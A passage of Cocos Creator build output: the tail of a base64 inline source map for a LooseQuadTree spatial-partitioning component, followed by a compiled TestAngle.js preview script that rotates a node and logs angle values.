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dBQUcsQ0FBQztRQUNuQyxPQUFPLENBQUMsU0FBUyxHQUFHLEVBQUUsQ0FBQztRQUN2QixpQ0FBaUM7UUFDakMsZ0NBQWdDO1FBQ2hDLCtIQUErSDtRQUMvSCxVQUFVO1FBQ1YsTUFBTTtRQUNOLG9CQUFvQjtRQUVwQixrQkFBa0I7UUFDbEIsSUFBSSxDQUFDLE1BQU0sR0FBRyxHQUFHLENBQUM7UUFDbEIsSUFBSSxDQUFDLFFBQVEsR0FBRyxPQUFPLENBQUM7SUFDNUIsQ0FBQzs7SUFuQ00sMkJBQWEsR0FBRyxDQUFDLENBQUM7SUFySXpCO1FBREMsUUFBUSxDQUFDLEVBQUMsT0FBTyxFQUFFLFFBQVEsRUFBQyxDQUFDO3dEQUNYO0lBSEYsYUFBYTtRQURqQyxPQUFPO09BQ2EsYUFBYSxDQTRLakM7SUFBRCxvQkFBQztDQTVLRCxBQTRLQyxDQTVLMEMsRUFBRSxDQUFDLFNBQVMsR0E0S3REO2tCQTVLb0IsYUFBYSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgTG9vc2VRdWFkVHJlZUNlbGwgZnJvbSBcIi4vTG9vc2VRdWFkVHJlZUNlbGxcIjtcclxuaW1wb3J0IEFBQkJSZWdpb24gZnJvbSBcIi4vQUFCQlJlZ2lvblwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG4vKiog5p2+5pWj5Zub5Y+J5qCR55qE5Li76KaB5oCd5oOz77yaXHJcbiAqICDlj6/ku6XogIPomZHliLDlnKjnm7jkuqTmtYvor5XkuK3vvIzmianlpKfljIXlm7Tnm5LmgLvmmK/kv53lrojnmoTvvIjov5nph4znmoTkv53lrojmmK/mjIfov5HkvLzljJbkuI3kvJrlgZrmiJDplJnor6/nu5PmnpzvvInjgILlpoLmnpzmiorlm5vlj4nvvI/lhavlj4nmoJHnmoTmraPmlrnvvI/nq4vmlrnnqbrpl7TlvZPkvZzljIXlm7Tnm5LvvIzpgqPkuYjmianlpKfov5nkupvljIXlm7Tnm5Lku6XlrrnnurPliJrlpb3lnKjovrnnlYzkuIrnm7jkuqTnmoTniankvZPkuZ/mmK/kv53lrojnmoRcclxuICogIDEu5bCGY2VsbOeahOWMuuWfn+aUvuWkp+S4gOWAje+8jOS/neivgeWIhuWxguWQju+8jOavj+S4queJqeS9k+W/heWumuiiq+afkOS4qmNlbGzljIXlkKtcclxuICogIDIu5p2+5pWj5ZCO77yM56Kw5pKe5Yik5pat5Lmf5piv5qC56IqC54K55b6A5b6A5LiL77yM5Yik5patdGVzdFJlY3TkuI5jZWxs55qE55u45Lqk77yM5aaC5p6c55u45Lqk5YiZ5Yik5pat5LiO5YW25a2Q6IqC54K555u45Lqk55qE5Yik5pat77yM5ZCm5YiZ5bCx6L+H5ruk5o6J5YW2Y2VsbOOAglxyXG4gKiAgMy7mlL7lpKfmtYvor5XljLrln5/kuI3kvJrmnInplJnor6/nmoTnu5PmnpzvvIzlkIzml7bkuZ/op6PlhrPkuoblnKjnibnmrorkvY3nva7kuIrnmoTniankvZPooqvmlL7liLDniLboioLngrnnmoTpl67popjjgIJcclxuICogKiovXHJcbi8qKiDku6XoioLngrnkuK3lv4PkuLrmraPkuK3lv4PvvIzku6XoioLngrnmnIDlpKflrr3pq5jkuLrovrnplb8gKi9cclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIExvb3NlUXVhZFRyZWUgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dG9vbHRpcDogXCLmnIDlsI/niankvZPovrnplb9cIn0pXHJcbiAgICBtaW5TaWRlTGVuZ3RoID0gMTA7XHJcblxyXG4gICAgLyoqIOaMieWxguWIkuWIhmNlbGzvvIzmlL7liLDkuI3lkIznmoTnvZHmoLzkuK0gKi9cclxuICAgIHByaXZhdGUgX2dyaWRzOiBBcnJheTxBcnJheTxMb29zZVF1YWRUcmVlQ2VsbD4+ID0gW107XHJcblxyXG4gICAgLyoqIOiuoeeul+aAu+WxguaVsO+8jOaehOmAoOavj+S4gOasoeeahOe9keagvEdyaWTvvIzmj5DliY3mnoTpgKDnvZHnu5zvvIzomb3nhLblhoXlrZjmtojogJflpKfvvIzkvYbkuI3nlKjov5DooYzml7bliqjmgIHliJvlu7rlkozplIDmr4FjZWxs77yM5o+Q6auY6L+Q6KGM5pWI546H44CCICovXHJcbiAgICBwcml2YXRlIGluaXQoKSB7XHJcbiAgICAgICAgLyoqIOaehOmAoOS4lueVjOefqeW9oiAqL1xyXG4gICAgICAgIGxldCBtYXhTaWRlID0gTWF0aC5tYXgodGhpcy5ub2RlLndpZHRoLCB0aGlzLm5vZGUuaGVpZ2h0KTtcclxuICAgICAgICAvKiog6K6h566X5bGC5pWwICovXHJcbiAgICAgICAgbGV0IG1heExldmVsID0gTWF0aC5jZWlsKE1hdGgubG9nMihtYXhTaWRlIC8gdGhpcy5taW5TaWRlTGVuZ3RoKSk7XHJcbiAgICAgICAgLyoqIOaehOW7uuaJgOaciee9keagvCAqL1xyXG4gICAgICAgIGxldCBtaW5YID0gLW1heFNpZGUgLyAyO1xyXG4gICAgICAgIGxldCBtYXhZID0gbWF4U2lkZS8yO1xyXG4gICAgICAgIC8qKiDmnIltYXhMZXZlbOWxgiAqL1xyXG4gICAgICAgIGxldCBzaWRlQ291bnQgPSBNYXRoLnBvdygyLCBtYXhMZXZlbCk7XHJcbiAgICAgICAgZm9yIChsZXQgaSA9IG1heExldmVsLTE7IGkgPj0gMDsgaS0tKSB7XHJcbiAgICAgICAgICAgIHRoaXMuX2dyaWRzW2ldID0gW107XHJcbiAgICAgICAgICAgIHNpZGVDb3VudCA9IHNpZGVDb3VudC8yO1xyXG4gICAgICAgICAgICBsZXQgY2VsbExlbmd0aCA9IG1heFNpZGUgLyBzaWRlQ291bnQ7XHJcbiAgICAgICAgICAgIC8qKiDmnoTlu7rmr4/kuIDlsYLnmoTnvZHmoLwgKi9cclxuICAgICAgICAgICAgZm9yIChsZXQgciA9IDA7IHIgPCBzaWRlQ291bnQ7IHIrKykge1xyXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgYyA9IDA7IGMgPCBzaWRlQ291bnQ7IGMrKykge1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCByZWN0ID0gY2MucmVjdChtaW5YICsgY2VsbExlbmd0aCAqIGMsIG1heFkgLSAocisxKSAqIGNlbGxMZW5ndGgsIGNlbGxMZW5ndGgsIGNlbGxMZW5ndGgpO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBxdWFkcyA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgIC8qKiDmnoTlu7rlm5vlhYPlrZDmoJEgKi9cclxuICAgICAgICAgICAgICAgICAgICBpZiAoaSA8IG1heExldmVsLTEpe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAvKiog5Y+W5Lik6KGM5Lik5YiXICovXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuZXh0U2lkZUNvdW50ID0gc2lkZUNvdW50KjI7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGo9MDsgajwyOyBqKyspe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaz0wOyBrPDI7IGsrKyl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcXVhZHMucHVzaCh0aGlzLl9ncmlkc1tpKzFdWyhyKjIraikqbmV4dFNpZGVDb3VudCArIGMqMitrXSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGluZGV4ID0gciAqIHNpZGVDb3VudCArIGM7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5fZ3JpZHNbaV1baW5kZXhdID0gbmV3IExvb3NlUXVhZFRyZWVDZWxsKGksIGluZGV4LCByZWN0LCBxdWFkcyk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSB1cGRhdGVDZWxsKGNlbGw6TG9vc2VRdWFkVHJlZUNlbGwpe1xyXG4gICAgICAgIGlmIChjZWxsLm9iamVjdENvdW50ID4gMCl7XHJcbiAgICAgICAgICAgIGNlbGwub2JqZWN0cy5mb3JFYWNoKHZhbHVlID0+IHRoaXMudXBkYXRlUmVnaW9uKHZhbHVlKSk7XHJcbiAgICAgICAgICAgIGNlbGwuY2hpbGRyZW4uZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgICAgICAgICBpZiAodmFsdWUub2JqZWN0Q291bnQgPiAwKXtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZUNlbGwodmFsdWUpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOabtOaWsOaJgOacieWFg+e0oCAqL1xyXG4gICAgdXBkYXRlQWxsKCl7XHJcbiAgICAgICAgdGhpcy51cGRhdGVDZWxsKHRoaXMuX2dyaWRzWzBdWzBdKTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5oyH5a6a5pu05paw5p+Q5LiA5Liq5YWD57SgICovXHJcbiAgICB1cGRhdGVSZWdpb24ocmVnaW9uOkFBQkJSZWdpb24pOmJvb2xlYW57XHJcbiAgICAgICAgaWYgKHJlZ2lvbi5sZXZlbCA8IDAgfHwgcmVnaW9uLmluZGV4IDwgMCl7XHJcbiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoXCJyZW1vdmUgZmFpbD09PmxldmVsPVwiK3JlZ2lvbi5sZXZlbCtcIiBpbmRleD1cIityZWdpb24uaW5kZXgpO1xyXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGxldCByZWN0ID0gcmVnaW9uLmFhYmIoKTtcclxuICAgICAgICBsZXQgcm9vdCA9IHRoaXMuX2dyaWRzWzBdWzBdO1xyXG4gICAgICAgIGxldCBsZXZlbCA9IHJlZ2lvbi5sZXZlbDtcclxuICAgICAgICAvL+mHjeaWsOiuoeeul2luZGV4XHJcbiAgICAgICAgbGV0IGNlbGxMZW5ndGggPSB0aGlzLl9ncmlkc1tsZXZlbF1bMF0uYm91bmRzLndpZHRoO1xyXG4gICAgICAgIGxldCBzaWRlQ291bnQgPSBNYXRoLnBvdygyLCBsZXZlbCk7XHJcbiAgICAgICAgbGV0IGNvbCA9IE1hdGguZmxvb3IoKHJlY3QuY2VudGVyLnggLSByb290LmJvdW5kcy54TWluKSAvIGNlbGxMZW5ndGgpO1xyXG4gICAgICAgIGxldCByb3cgPSBNYXRoLmZsb29yKChyb290LmJvdW5kcy55TWF4IC0gcmVjdC5jZW50ZXIueSkgLyBjZWxsTGVuZ3RoKTtcclxuICAgICAgICBsZXQgaW5kZXggPSByb3cgKiBzaWRlQ291bnQgKyBjb2w7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2coaW5kZXgsIHJlZ2lvbi5pbmRleCwgaW5kZXggPT09IHJlZ2lvbi5pbmRleCk7XHJcbiAgICAgICAgaWYgKGluZGV4ICE9IHJlZ2lvbi5pbmRleCl7XHJcbiAgICAgICAgICAgIHRoaXMuX2dyaWRzW3JlZ2lvbi5sZXZlbF1bcmVnaW9uLmluZGV4XS5yZW1vdmVPYmplY3QocmVnaW9uKTtcclxuICAgICAgICAgICAgbGV0IGNlbGwgPSB0aGlzLl9ncmlkc1tsZXZlbF1baW5kZXhdO1xyXG4gICAgICAgICAgICBjZWxsLmFkZE9iamVjdChyZWdpb24pO1xyXG4gICAgICAgIH1cclxuICAgICAgICByZXR1cm4gdHJ1ZTtcclxuICAgIH1cclxuXHJcbiAgICBpbnNlcnQocmVnaW9uOkFBQkJSZWdpb24pOmJvb2xlYW57XHJcbiAgICAgICAgaWYgKHJlZ2lvbi5pbmRleCA+PSAwIHx8IHJlZ2lvbi5sZXZlbCA+PSAwKXtcclxuICAgICAgICAgICAgY29uc29sZS5lcnJvcihcIuW3sue7j+WIhumFjeepuumXtGxldmVsPVwiK3JlZ2lvbi5sZXZlbCtcIiBpbmRleD1cIityZWdpb24uaW5kZXgpO1xyXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGxldCByZWN0ID0gcmVnaW9uLmFhYmIoKTtcclxuICAgICAgICBsZXQgbWF4U2lkZSA9IE1hdGgubWF4KHJlY3Qud2lkdGgsIHJlY3QuaGVpZ2h0KTtcclxuICAgICAgICBsZXQgcm9vdCA9IHRoaXMuX2dyaWRzWzBdWzBdO1xyXG4gICAgICAgIGxldCByb290U2lkZSA9IHJvb3QuYm91bmRzLndpZHRoO1xyXG4gICAgICAgIGlmIChtYXhTaWRlID4gcm9vdFNpZGUpe1xyXG4gICAgICAgICAgICBjb25zb2xlLmVycm9yKFwicmVnaW9uIHJlY3QgdG9vIGJpZywgY2FuIG5vdCBpbnNlcnQgaXRcIik7XHJcbiAgICAgICAgICAgIHJldHVybiBudWxsO1xyXG4gICAgICAgIH1cclxuICAgICAgICBsZXQgbGV2ZWwgPSBNYXRoLmZsb29yKE1hdGgubG9nMihyb290U2lkZS9tYXhTaWRlKSk7XHJcbiAgICAgICAgaWYgKGxldmVsID4gdGhpcy5fZ3JpZHMubGVuZ3RoIC0gMSl7XHJcbiAgICAgICAgICAgIGxldmVsID0gdGhpcy5fZ3JpZHMubGVuZ3RoIC0gMTtcclxuICAgICAgICAgICAgY29uc29sZS53YXJuKCdNYXliZSB0aGlzIGl0ZW0gaXMgdG9vIHNtYWxsLCBidXQgd2UgY2FuIGFkZCBpdCB0byBtYXggbGV2ZWwuJywgcm9vdFNpZGUsIG1heFNpZGUsIGxldmVsLCB0aGlzLl9ncmlkcy5sZW5ndGgsIHJlZ2lvbi5ub2RlLm5hbWUpO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgbGV0IGNlbGxMZW5ndGggPSB0aGlzLl9ncmlkc1tsZXZlbF1bMF0uYm91bmRzLndpZHRoO1xyXG4gICAgICAgIGxldCBzaWRlQ291bnQgPSBNYXRoLnBvdygyLCBsZXZlbCk7XHJcbiAgICAgICAgbGV0IGNvbCA9IE1hdGguZmxvb3IoKHJlY3QuY2VudGVyLnggLSByb290LmJvdW5kcy54TWluKSAvIGNlbGxMZW5ndGgpO1xyXG4gICAgICAgIGxldCByb3cgPSBNYXRoLmZsb29yKChyb290LmJvdW5kcy55TWF4IC0gcmVjdC5jZW50ZXIueSkgLyBjZWxsTGVuZ3RoKTtcclxuICAgICAgICBsZXQgaW5kZXggPSByb3cgKiBzaWRlQ291bnQgKyBjb2w7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2coXCJsZXZlbD1cIitsZXZlbCtcIiBpbmRleD1cIitpbmRleCk7XHJcbiAgICAgICAgbGV0IGNlbGwgPSB0aGlzLl9ncmlkc1tsZXZlbF1baW5kZXhdO1xyXG4gICAgICAgIGNlbGwuYWRkT2JqZWN0KHJlZ2lvbik7XHJcbiAgICAgICAgLy8gdGhpcy5fZ3JhcGhpYy5yZWN0KHJlY3QueE1pbiwgcmVjdC55TWluLCByZWN0LndpZHRoLCByZWN0LmhlaWdodCk7XHJcbiAgICAgICAgLy8gdGhpcy5fZ3JhcGhpYy5zdHJva2UoKTtcclxuICAgICAgICByZXR1cm4gdHJ1ZTtcclxuICAgIH1cclxuXHJcbiAgICByZW1vdmUocmVnaW9uOkFBQkJSZWdpb24pOmJvb2xlYW57XHJcbiAgICAgICAgaWYgKHJlZ2lvbi5sZXZlbCA8IDAgfHwgcmVnaW9uLmluZGV4IDwgMCl7XHJcbiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoXCJyZW1vdmUgZmFpbD09PmxldmVsPVwiK3JlZ2lvbi5sZXZlbCtcIiBpbmRleD1cIityZWdpb24uaW5kZXgpO1xyXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMuX2dyaWRzW3JlZ2lvbi5sZXZlbF1bcmVnaW9uLmluZGV4XS5yZW1vdmVPYmplY3QocmVnaW9uKTtcclxuICAgICAgICByZXR1cm4gdHJ1ZTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgcmV0cmlldmUocmVjdDpjYy5SZWN0LCBvdXQ6QXJyYXk8QUFCQlJlZ2lvbj4pe1xyXG4gICAgICAgIExvb3NlUXVhZFRyZWUucmV0cmlldmVDb3VudCA9IDA7XHJcbiAgICAgICAgdGhpcy5fZ3JpZHNbMF1bMF0ucmV0cmlldmUocmVjdCwgb3V0KTtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhcIkxvb3NlUXVhZFRyZWU9PT5cIiwgTG9vc2VRdWFkVHJlZS5yZXRyaWV2ZUNvdW50LCBvdXQpO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBfZ3JhcGhpYzpjYy5HcmFwaGljcyA9IG51bGw7XHJcblxyXG4gICAgc3RhdGljIHJldHJpZXZlQ291bnQgPSAwO1xyXG4gICAgdGVzdChyZWN0OmNjLlJlY3Qpe1xyXG4gICAgICAgIGxldCBncmFwaGljID0gdGhpcy5fZ3JhcGhpYztcclxuICAgICAgICBncmFwaGljLmNsZWFyKCk7XHJcblxyXG4gICAgICAgIGxldCBhcnIgPSBbXTtcclxuICAgICAgICB0aGlzLnJldHJpZXZlKHJlY3QsIGFycik7XHJcblxyXG4gICAgICAgIGFyci5mb3JFYWNoKHZhbHVlID0+IHtcclxuICAgICAgICAgICAgbGV0IGFhYmIgPSB2YWx1ZS5hYWJiKCk7XHJcbiAgICAgICAgICAgIGdyYXBoaWMucmVjdChhYWJiLnhNaW4sIGFhYmIueU1pbiwgYWFiYi53aWR0aCwgYWFiYi5oZWlnaHQpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgICAgIGdyYXBoaWMuc3Ryb2tlKCk7XHJcbiAgICB9XHJcblxyXG5cclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB0aGlzLmluaXQoKTtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyh0aGlzLl9ncmlkcyk7XHJcbiAgICAgICAgbGV0IG5vZGUgPSBuZXcgY2MuTm9kZSgpO1xyXG4gICAgICAgIHRoaXMubm9kZS5hZGRDaGlsZChub2RlKTtcclxuICAgICAgICBsZXQgZ3JhcGhpYyA9IG5vZGUuYWRkQ29tcG9uZW50KGNjLkdyYXBoaWNzKTtcclxuICAgICAgICBncmFwaGljLnN0cm9rZUNvbG9yID0gY2MuQ29sb3IuUkVEO1xyXG4gICAgICAgIGdyYXBoaWMubGluZVdpZHRoID0gMjA7XHJcbiAgICAgICAgLy8gdGhpcy5fZ3JpZHMuZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgLy8gICAgIHZhbHVlLmZvckVhY2godmFsdWUxID0+IHtcclxuICAgICAgICAvLyAgICAgICAgIGdyYXBoaWMucmVjdCh2YWx1ZTEubG9vc2VCb3VuZHMueE1pbiwgdmFsdWUxLmxvb3NlQm91bmRzLnlNaW4sIHZhbHVlMS5sb29zZUJvdW5kcy53aWR0aCwgdmFsdWUxLmxvb3NlQm91bmRzLmhlaWdodCk7XHJcbiAgICAgICAgLy8gICAgIH0pO1xyXG4gICAgICAgIC8vIH0pO1xyXG4gICAgICAgIC8vIGdyYXBoaWMuc3Ryb2tlKCk7XHJcblxyXG4gICAgICAgIC8vIGdyYXBoaWMuZmlsbCgpO1xyXG4gICAgICAgIG5vZGUuekluZGV4ID0gMTAwO1xyXG4gICAgICAgIHRoaXMuX2dyYXBoaWMgPSBncmFwaGljO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/test/TestAngle.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '08336c0HZ1Nj6P1bDyiai7U', 'TestAngle');
// script/test/TestAngle.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var TestAngle = /** @class */ (function (_super) {
    __extends(TestAngle, _super);
    function TestAngle() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    // LIFE-CYCLE CALLBACKS:
    // onLoad () {}
    TestAngle.prototype.start = function () {
        var _this = this;
        this.node.on(cc.Node.EventType.ROTATION_CHANGED, function () {
            var radians = cc.misc.degreesToRadians(-_this.node.rotation);
            var dir = cc.v2(0, 1).rotate(radians);
            var angle = cc.v2(0, 1).angle(dir);
            console.log("angle=" + angle + " rotation=" + _this.node.rotation + " radians=" + radians + " dir.x=" + dir.x + " dir.y=" + dir.y);
        });
        this.node.runAction(cc.rotateBy(3, 360));
    };
    TestAngle = __decorate([
        ccclass
    ], TestAngle);
    return TestAngle;
}(cc.Component));
exports.default = TestAngle;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
